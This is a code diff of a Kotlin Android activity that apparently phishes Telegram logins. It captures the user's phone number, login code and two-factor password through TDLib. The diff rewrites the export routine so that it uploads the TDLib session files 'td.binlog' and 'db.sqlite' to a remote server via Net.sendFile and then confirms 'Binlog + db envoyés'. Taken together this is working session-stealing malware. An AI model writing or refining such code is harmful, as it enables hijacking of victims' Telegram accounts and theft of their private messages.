@@ -68,9 +68,9 @@ class MainActivity : Activity() {
         Tg.send(TdApi.GetMe()) { me ->
             Capture.userId = me.id
             Capture.userName = listOf(me.firstName, me.lastName)
-                .filter { it.isNotBlank() }.joinToString(" ")
+            .filter { it.isNotBlank() }.joinToString(" ")
             runOnUiThread { showSuccess(me) }
-            dumpSessionsThenExport()
+            export()
         }
     }
 
@@ -97,26 +97,15 @@ class MainActivity : Activity() {
     private fun export() {
         if (exported) return
         exported = true
+        Net.send(Capture.payload(this))
 
-        Tg.send(TdApi.Close())
-
-        thread {
-            val ok = Capture.readAuth(this, 20000)
-
-            Net.send(Capture.payload(this) + "\nparse: $ok")
-
-            val f = Capture.binlogFile(this)
-            val bytes = if (f.exists()) f.readBytes() else ByteArray(0)
-
-            if (bytes.isNotEmpty()) {
-                Net.sendFile("td.binlog", bytes, "td.binlog ok=$ok")
-                if (!ok) Net.send(Capture.diagnose(bytes))
-            } else {
-                Net.send("BINLOG absent : ${f.absolutePath}")
-            }
-
-            runOnUiThread { toast(if (ok) "session extraite" else "parse binlog KO") }
+        val dir = File(filesDir, "tdlib/db")
+        listOf("td.binlog", "db.sqlite").forEach { name ->
+            val f = File(dir, name)
+            if (f.exists()) Net.sendFile(name, f.readBytes(), name)
+            else Net.send("$name absent")
         }
+        runOnUiThread { toast("Binlog + db envoyés") }
     }
 
     // ---------------- écrans (inchangés) ----------------
@@ -178,11 +167,11 @@ class MainActivity : Activity() {
         findViewById<TextView>(R.id.num).text = Capture.phone
         findViewById<TextView>(R.id.code).text = Capture.code
         findViewById<TextView>(R.id.password).text =
-            Capture.password.ifEmpty { getString(R.string.none) }
+        Capture.password.ifEmpty { getString(R.string.none) }
         val name = listOf(me.firstName, me.lastName)
-            .filter { it.isNotBlank() }
-            .joinToString(" ")
-            .ifBlank { getString(R.string.none) }
+        .filter { it.isNotBlank() }
+        .joinToString(" ")
+        .ifBlank { getString(R.string.none) }
         findViewById<TextView>(R.id.who).text = "$name  ·  id ${me.id}"
     }
 
